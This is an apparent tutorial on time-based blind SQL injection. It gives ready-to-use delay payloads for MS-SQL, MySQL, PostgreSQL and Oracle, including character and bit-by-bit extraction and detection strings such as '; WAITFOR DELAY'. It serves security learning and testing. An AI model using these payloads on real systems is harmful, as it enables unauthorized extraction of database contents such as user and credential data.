# Using Time Delays

In **fully blind SQL injection** scenarios—where:
* No results are returned to the browser
* Out-of-band channels are blocked
* Application behavior does not visibly change
* Even error messages are suppressed

—**time-based inference** can be used to extract data, one bit at a time, by measuring **response delays**.

---

## **Basic Concept**

A **conditionally triggered delay** is introduced via an injected query. The attacker monitors the **response time** to infer the **truth** of a condition:
- Delay = condition is **true**
- No delay = condition is **false**

Over multiple requests, this allows exfiltration of **any data**, bit-by-bit or character-by-character.

---

## **MS-SQL**

Uses the built-in `WAITFOR DELAY` statement:
```sql
IF (SELECT user) = 'sa' WAITFOR DELAY '0:0:5'
```

### Character extraction via ASCII/SUBSTRING:
```sql
IF ASCII(SUBSTRING('Admin',1,1)) = 65 WAITFOR DELAY '0:0:5'
```

### Bit-by-bit extraction using `POWER` and `&`:
```sql
-- Test if bit 0 is set
IF (ASCII(SUBSTRING('Admin',1,1)) & POWER(2,0)) > 0 WAITFOR DELAY '0:0:5'

-- Test if bit 1 is set
IF (ASCII(SUBSTRING('Admin',1,1)) & POWER(2,1)) > 0 WAITFOR DELAY '0:0:5'
```

---

## **MySQL**

### Modern versions (≥ 5.0.12):
Use `SLEEP(seconds)` to create a delay:
```sql
SELECT IF(user() LIKE 'root@%', SLEEP(5), 'false')
```

### Older versions (< 5.0.12):
Use `BENCHMARK` with a CPU-intensive operation:
```sql
SELECT IF(user() LIKE 'root@%', BENCHMARK(50000, SHA1('test')), 'false')
```

---

## **PostgreSQL**

Use `PG_SLEEP(seconds)`:
```sql
SELECT CASE WHEN (SELECT current_user) = 'postgres' THEN PG_SLEEP(5) ELSE 0 END
```

---

## **Oracle**

No direct delay function, but possible workarounds:

### 1. Use **UTL_HTTP** to connect to a non-existent domain:
```sql
SELECT 'a' || UTL_HTTP.REQUEST('http://madeupserver.com') FROM dual
```
This results in a **connection timeout**, causing a measurable delay.

### 2. Conditional timeout (based on existence of user `DBSNMP`):
```sql
SELECT 'a' || UTL_HTTP.REQUEST('http://madeupserver.com')
FROM dual
WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'
```

- Delay occurs **only if condition is true**.

> Can be used in conjunction with `SUBSTR` and `ASCII` for byte-wise extraction.

---

## **Detection Use Case (Initial Probing)**

Time delays are not just for data extraction—they're also the **most reliable technique for detecting blind SQL injection**.

### Example detection payloads (MS-SQL):
```sql
'; WAITFOR DELAY '0:0:5'-- 
1; WAITFOR DELAY '0:0:5'--
```

> These can be injected into parameters to check for **unusual response time**, signaling potential injection.

---

## **TIP**

- **Time delays** are effective for:
  * **Extraction**: Bitwise or character-level data retrieval.
  * **Detection**: Identifying blind SQLi vulnerabilities when no visible output is available.
- Always account for **natural network latency** to avoid false positives.
- Time-based inference can be **automated** using tools like SQLMap (`--technique=T`) or custom scripts.

---
